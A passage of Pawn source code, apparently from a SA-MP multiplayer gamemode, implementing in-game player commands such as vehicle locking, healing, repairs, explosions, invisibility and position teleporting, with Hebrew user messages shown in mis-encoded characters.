		SetPlayerChatBubble(playerid,cmd,white,20.0,30000);
		return 1;
	}
	if(equal(cmd,"/lock"))
	{
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .òìéê ìäéåú äðäâ áëãé ìðòåì àú äøëá");
			case PLAYER_STATE_DRIVER:
			{
				SendClientMessage(playerid,green," .äîëåðéú ððòìä");
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,0,1);
				vehicleinfo[GetPlayerVehicleID(playerid)][lastdriver] = playerid;
				vehicleinfo[GetPlayerVehicleID(playerid)][locked] = 1;
			}
			default: SendClientMessage(playerid,red," .òìéê ìäéåú áúåê äøëá áëãé ìðòåì àåúå");
		}
		return 1;
	}
	if(equal(cmd,"/unlock"))
	{
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .òìéê ìäéåú äðäâ áëãé ìôúåç àú äøëá");
			case PLAYER_STATE_DRIVER:
			{
				SendClientMessage(playerid,green," .äîëåðéú ðôúçä");
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,0,0);
				vehicleinfo[GetPlayerVehicleID(playerid)][lastdriver] = INVALID_PLAYER_ID;
				vehicleinfo[GetPlayerVehicleID(playerid)][locked] = 0;
			}
			default: SendClientMessage(playerid,red," .òìéê ìäéåú áúåê äøëá áëãé ìôúåç àåúå");
		}
		return 1;
	}
	if(equal(cmd,"/outcar"))
	{
		new id, string[M_S];
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá ëãé ìäòéó îîðå ùç÷ï");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /outcar [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäåöéà àú òöîê îäøëá ùìê");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .òìéê ìäéåú äðäâ áëãé ìäåöéà ùç÷ðéí îäøëá");
			case PLAYER_STATE_DRIVER:
			{
				if(!IsPlayerInVehicle(id,GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .äùç÷ï ìà áøëá ùìê");
				RemovePlayerFromVehicle(id);
				format(string,sizeof(string)," .îäøëá ùìê %s äåöàú àú",GetName(id));
				SendClientMessage(playerid,red,string);
				format(string,sizeof(string)," .äåöéà àåúê îäøëá ùìå %s",GetName(playerid));
				SendClientMessage(id,red,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/outcarall"))
	{
		new string[M_S], ids = 0;
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú ðäâ áøëá òì îðú ìäåöéà îîðå ùç÷ðéí");
		format(string,sizeof(string)," .äåöéà àú ëì äðåñòéí îäøëá ùìå %s",GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		{
		    RemovePlayerFromVehicle(i);
			SendClientMessage(i,red,string);
			ids++;
		}
		if(!ids) return SendClientMessage(playerid,red," .àéï ùç÷ðéí áøëá ùìê");
		return 1;
	}
	if(equal(cmd,"/healme") || equal(cmd,"/hm"))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][death][0]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		switch(playerinfo[playerid][upgradecmd][lcmdid("/healme")])
		{
			case 1: SetPlayerHealth2(playerid,100.0);
			case 2:
			{
			    new Float:h;
			    GetPlayerHealth(playerid,h);
			    if(h >= 100.0) SetPlayerArmour2(playerid,100.0);
			    else SetPlayerHealth2(playerid,100.0);
			}
		    case 3:
			{
				SetPlayerHealth2(playerid,100.0);
				SetPlayerArmour2(playerid,100.0);
			}
		}
		SendClientMessage(playerid,green," .äçééí ùìê äúîìàå");
		playerinfo[playerid][death][0] = 1;
		return 1;
	}
	if(equal(cmd,"/healhim") || equal(cmd,"/hh"))
	{
		new id, string[M_S], Float:p[3];
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][death][0]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /healhim [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0) return SendClientMessage(playerid,red," .òìéê ìäéåú ÷øåá àì äùç÷ï àåúå àúä øåöä ìøôà");
		switch(playerinfo[playerid][upgradecmd][lcmdid("/healhim")])
		{
			case 1: SetPlayerHealth2(id,100.0);
			case 2:
			{
			    new Float:h;
			    GetPlayerHealth(id,h);
			    if(h >= 100.0) SetPlayerArmour2(id,100.0);
			    else SetPlayerHealth2(id,100.0);
			}
		    case 3:
			{
				SetPlayerHealth2(id,100.0);
				SetPlayerArmour2(id,100.0);
			}
		}
		format(string,sizeof(string)," .%s îéìéú àú äçééí ùì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .îéìà àú äçééí ùìê %s",GetName(playerid));
		SendClientMessage(id,green,string);
		playerinfo[playerid][death][0] = 1;
		return 1;
	}
	if(equal(cmd,"/healus") || equal(cmd,"/hu"))
	{
		new string[M_S], Float:p[3];
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][death][0]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		format(string,sizeof(string)," .îéìà àú äçééí ùìê %s",GetName(playerid));
		switch(playerinfo[playerid][upgradecmd][lcmdid("/healus")])
		{
			case 1:
			{
				for(new id = 0; id < MAX_PLAYERS; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 2.5)
				{
					SetPlayerHealth2(id,100.0);
					if(id != playerid) SendClientMessage(id,green,string);
				}
			}
			case 2:
			{
			    for(new id = 0; id < MAX_PLAYERS; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 3.0)
			    {
				    new Float:h;
				    GetPlayerHealth(id,h);
				    if(h >= 100.0) SetPlayerArmour2(id,100.0);
				    else SetPlayerHealth2(id,100.0);
					if(id != playerid) SendClientMessage(id,green,string);
			    }
			}
		    case 3:
			{
			    for(new id = 0; id < MAX_PLAYERS; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 5.0)
			    {
					SetPlayerHealth2(id,100.0);
					SetPlayerArmour2(id,100.0);
					if(id != playerid) SendClientMessage(id,green,string);
				}
			}
		}
		SendClientMessage(playerid,green," .îéìéú àú äçééí ìùç÷ðéí ä÷øåáéí àìéê");
		playerinfo[playerid][death][0] = 1;
		return 1;
	}
	if(equal(cmd,"/fix"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá áëãé ìú÷ï àåúå");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][death][1] && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		if(playerinfo[playerid][death][1] && IsPlayerMAdmin(playerid) && playerinfo[playerid][admin] < 6) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		if(playerinfo[playerid][upgradecmd][lcmdid("/fix")] == 2) RepairVehicle(GetPlayerVehicleID(playerid));
		else SetVehicleHealth(GetPlayerVehicleID(playerid),1000.0);
		SendClientMessage(playerid,green," .äøëá ùìê úå÷ï");
		playerinfo[playerid][death][1] = 1;
		PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/boom") || equal(cmd,"/bm"))
	{
		new Float:p[3];
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][death][2]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		if(GetPlayerState(playerid) == PLAYER_STATE_WASTED && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå ëàùø àúä îú");
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateExplosion(p[0],p[1],p[2],playerinfo[playerid][upgradecmd][lcmdid("/boom")] == 2 ? 7 : 6,75);
		playerinfo[playerid][death][2] = 1;
		return 1;
	}
	if(equal(cmd,"/flip"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá áëãé ìäôåê àåúå");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		new Float:za;
		GetVehicleZAngle(GetPlayerVehicleID(playerid),za);
		SetVehicleZAngle(GetPlayerVehicleID(playerid),za);
		SendClientMessage(playerid,green," .äøëá ùìê äúäôê");
		return 1;
	}
	if(equal(cmd,"/gmw"))
	{
		new id, string[M_S], wd[2], Float:p[3], weaps = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /gmw [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerid == id) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0) return SendClientMessage(playerid,red," .òìéê ìäéåú ÷øåá àì äùç÷ï ìå áøöåðê ìúú àú ðù÷ééê");
		for(new i = 0; i < 13; i++)
		{
			GetPlayerWeaponData(playerid,i,wd[0],wd[1]);
			weaps++;
			if(wd[0] != 0 && wd[1] != 0) GiveWeapon(id,wd[0],wd[1]);
		}
		if(!weaps) return SendClientMessage(playerid,red," .àéï ìê ðù÷éí");
		ResetPlayerWeapons(playerid);
		format(string,sizeof(string)," .%s ðúú àú ëì ðù÷ééê ì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ðúï ìê àú ëì äðù÷éí ùìå %s",GetName(playerid));
		SendClientMessage(id,green,string);
		playerinfo[id][gw] = 1;
		return 1;
	}
	if(equal(cmd,"/vcolor"))
	{
		new c1, c2;
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá áëãé ìùðåú àú öáòå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /vcolor [0 - 126] [0 - 126] :öåøú äùéîåù");
			if(playerinfo[playerid][upgradecmd][lcmdid("/vcolor")] == 2) SendClientMessage(playerid,white," /vcolor s [1-7] :öåøú äùéîåù - öáò îéåçã");
			return 1;
		}
		if(IsNumeric(cmd))
		{
			c1 = strval(cmd), cmd = strtok(cmdtext,idx), c2 = !strlen(cmd) || !IsNumeric(cmd) ? c1 : strval(cmd);
			if(c1 < 0 || c1 > 126 || c2 < 0 || c2 > 126) return SendClientMessage(playerid,red," .àçã äöáòéí ùâåé");
		}
		else
		{
		    if(equal(cmd,"s"))
		    {
		        cmd = strtok(cmdtext,idx);
		        if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /vcolor s [1-7] :öåøú äùéîåù - öáò îéåçã");
		        new sid = strval(cmd);
		        switch(sid)
		        {
		            case 1: c1 = 131, c2 = 132;
		            case 2: c1 = 149, c2 = 186;
		            case 3: c1 = 142, c2 = 144;
		            case 4: c1 = 155, c2 = 156;
		            case 5: c1 = 236, c2 = 251;
		            case 6: c1 = 199826, c2 = 252;
		            case 7: c1 = 154, c2 = 169;
		            default: return SendClientMessage(playerid,red," .öáò îéåçã ùâåé");
		        }
		    }
		    else return SendClientMessage(playerid,red," .öáò îéåçã ùâåé");
		}
		ChangeVehicleColor(GetPlayerVehicleID(playerid),c1,c2);
		PlayerPlaySound(playerid,1134,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/invisible"))
	{
		if(playerinfo[playerid][invisible]) return SendClientMessage(playerid,red," .àúä ëáø áîöá áéìúé ðøàä");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(!IsPlayerConnected(i)) continue;
			ShowPlayerNameTagForPlayer(i,playerid,0);
			SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,30));
		}
		playerinfo[playerid][invisible] = 1;
		SendClientMessage(playerid,green," .ëòú àúä áéìúé ðøàä");
		return 1;
	}
	if(equal(cmd,"/visible"))
	{
		if(!playerinfo[playerid][invisible]) return SendClientMessage(playerid,red," .àúä ìà áîöá áéìúé ðøàä");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(!IsPlayerConnected(i)) continue;
			ShowPlayerNameTagForPlayer(i,playerid,1);
			SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
		}
		playerinfo[playerid][invisible] = 0;
		SendClientMessage(playerid,green," .ëòú àúä ðøàä");
		return 1;
	}
	if(equal(cmd,"/setfire"))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		if(GetMoney(playerid) < 1500) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ùéîåù áô÷åãä äæå òåìä 1500$");
		GiveMoney(playerid,0-1500);
		new Float:p[3], Float:setp = 10.0;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(playerinfo[playerid][upgradecmd][lcmdid("/setfire")] == 2)
		{
			for(new i = 0; i < 3; i++)
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],setp);
				CreateExplosion(p[0],p[1],p[2],9,2);
				CreateExplosion(p[0],p[1],p[2],randomEx(4,6),5);
				setp += 8.5;
			}
		}
		else
		{
			GetXYInFrontOfPlayer(playerid,p[0],p[1],setp);
			CreateExplosion(p[0],p[1],p[2],9,2);
			CreateExplosion(p[0],p[1],p[2],randomEx(4,6),5);
		}
		return 1;
	}
	if(equal(cmd,"/bigbang"))
	{
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúîù áô÷åãä æå ëàùø àúä áàéæåø ãé-àí");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
		if(GetMoney(playerid) < 2000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ùéîåù áô÷åãä äæå òåìä 2000$");
		GiveMoney(playerid,0-2000);
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(playerinfo[playerid][upgradecmd][lcmdid("/setfire")] == 2)
		{
			CreateExplosion(p[0]+5.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0]+10.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0],p[1]+5.0,p[2],12,7.5);
			CreateExplosion(p[0],p[1]+10.0,p[2],12,7.5);
			CreateExplosion(p[0]+5.0,p[1]+10.0,p[2],12,7.5);
			CreateExplosion(p[0]+10.0,p[1]+5.0,p[2],12,7.5);
			CreateExplosion(p[0]-5.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0]-10.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0],p[1]-5.0,p[2],12,7.5);
			CreateExplosion(p[0],p[1]-10.0,p[2],12,7.5);
			CreateExplosion(p[0]-5.0,p[1]-10.0,p[2],12,7.5);
			CreateExplosion(p[0]-10.0,p[1]-5.0,p[2],12,7.5);
			CreateExplosion(p[0]+5.0,p[1],p[2]+5.0,12,7.5);
			CreateExplosion(p[0]+10.0,p[1],p[2]+5.0,12,7.5);
			CreateExplosion(p[0],p[1]+5.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0],p[1]+10.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0]+5.0,p[1]+10.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0]+10.0,p[1]+5.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0]-5.0,p[1],p[2]+5.0,12,7.5);
			CreateExplosion(p[0]-10.0,p[1],p[2]+5.0,12,7.5);
			CreateExplosion(p[0],p[1]-5.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0],p[1]-10.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0]-5.0,p[1]-10.0,p[2]+5.0,12,7.5);
			CreateExplosion(p[0]-10.0,p[1]-5.0,p[2]+5.0,12,7.5);
		}
		else
		{
			CreateExplosion(p[0]+5.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0]+10.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0],p[1]+5.0,p[2],12,7.5);
			CreateExplosion(p[0],p[1]+10.0,p[2],12,7.5);
			CreateExplosion(p[0]+5.0,p[1]+10.0,p[2],12,7.5);
			CreateExplosion(p[0]+10.0,p[1]+5.0,p[2],12,7.5);
			CreateExplosion(p[0]-5.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0]-10.0,p[1],p[2],12,7.5);
			CreateExplosion(p[0],p[1]-5.0,p[2],12,7.5);
			CreateExplosion(p[0],p[1]-10.0,p[2],12,7.5);
			CreateExplosion(p[0]-5.0,p[1]-10.0,p[2],12,7.5);
			CreateExplosion(p[0]-10.0,p[1]-5.0,p[2],12,7.5);
		}
		SetPlayerHealth2(playerid,100.0);
		return 1;
	}
	if(equal(cmd,"/pos"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /pos [save/goto/reset] :öåøú äùéîåù");
		if(equal(cmd,"save"))
		{
			if(playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .ëáø éù ìê îé÷åí ùîåø");
			if((GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != world_normal) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .àéðê éëåì ìáöò àú äô÷åãä äæå áîé÷åîê äðåëçé");
			new string[M_S], Float:op[3];
			for(new c=1;c<MAX_CLANS;c++) if(claninfo[c][cvalid] && c != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][c])
			{
				for(new i=0,o=0;o<claninfo[c][cobjects];o++)
				{
					i = claninfo[c][cobject][o];
					if(IsValidSObject(i) && objectinfo[i][omoving][1] == c)
					{
						GetSObjectPos(i,op[0],op[1],op[2]);
						if(GetPlayerDistanceToPointEx(playerid,op[0],op[1],op[2]) <= 100.0)
						{
							format(string,sizeof(string)," .%s äîé÷åí äæä ÷øåá îãé ìîô÷ãú ä÷ìàï",claninfo[c][cname]);
							SendClientMessage(playerid,red,string);
							return 1;
						}
					}
				}
			}
			if(GetMoney(playerid) < 5000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ùéîåù áô÷åãä äæå òåìä 5000$");
			GiveMoney(playerid,0-5000);
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = p[i];
			playerinfo[playerid][mark2][0] = GetPlayerInterior(playerid);
			playerinfo[playerid][mark2][1] = GetPlayerVirtualWorld(playerid);
			playerinfo[playerid][mark2][2] = 1;
			SetPlayerMapIcon(playerid,icon_player,p[0],p[1],p[2],35,0);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			SendClientMessage(playerid,green," .äîé÷åí ðùîø");
		}
		else if(equal(cmd,"goto"))
		{
			if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .àéï ìê îé÷åí ùîåø");
			if(GetMoney(playerid) < 3000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, ùéîåù áô÷åãä äæå òåìä 3000$");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä á÷øá àéùé");
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä áãøéôè");
			GiveMoney(playerid,0-3000);
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER: SetPlayerPos(playerid,playerinfo[playerid][mark][0]+floatrand(-1.0,1.0),playerinfo[playerid][mark][1]+floatrand(-1.0,1.0),playerinfo[playerid][mark][2]);
				case PLAYER_STATE_DRIVER:
				{
					SetVehiclePos(GetPlayerVehicleID(playerid),playerinfo[playerid][mark][0]+floatrand(-3.0,3.0),playerinfo[playerid][mark][1]+floatrand(-3.0,3.0),playerinfo[playerid][mark][2]);
					LinkVehicleToInterior(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][0]);
					SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][1]);
				}
			}
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,playerinfo[playerid][mark2][0]);
			SetPlayerVirtualWorld(playerid,playerinfo[playerid][mark2][1]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			SendClientMessage(playerid,green," .ùåâøú àì äîé÷åí äùîåø ùìê");
		}
		else if(equal(cmd,"reset"))
		{
			if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .àéï ìê îé÷åí ùîåø");
			for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
			playerinfo[playerid][mark2] = {0,world_normal,0};
			RemovePlayerMapIcon(playerid,icon_player);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			SendClientMessage(playerid,green," .äîé÷åí äùîåø ùìê äåñø");
		}
		else return SendClientMessage(playerid,red,"");
		return 1;
	}
	if(equal(cmd,"/slow"))
	{
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú áøëá");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		playerinfo[playerid][slow] = CreatePickupEx(1241,15,p[0],p[1],p[2]);
		SetTimerEx("DestroyPickup2",1000,0,"i",playerinfo[playerid][slow]);
		return 1;
	}
	if(equal(cmd,"/ghost"))
	{
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ìà ðéúï ìäëðñ ìòåìí äøåçåú ëàùø àúä áøëá");
		if(playerinfo[playerid][dmzone] != dmz_none ||
		playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass] ||
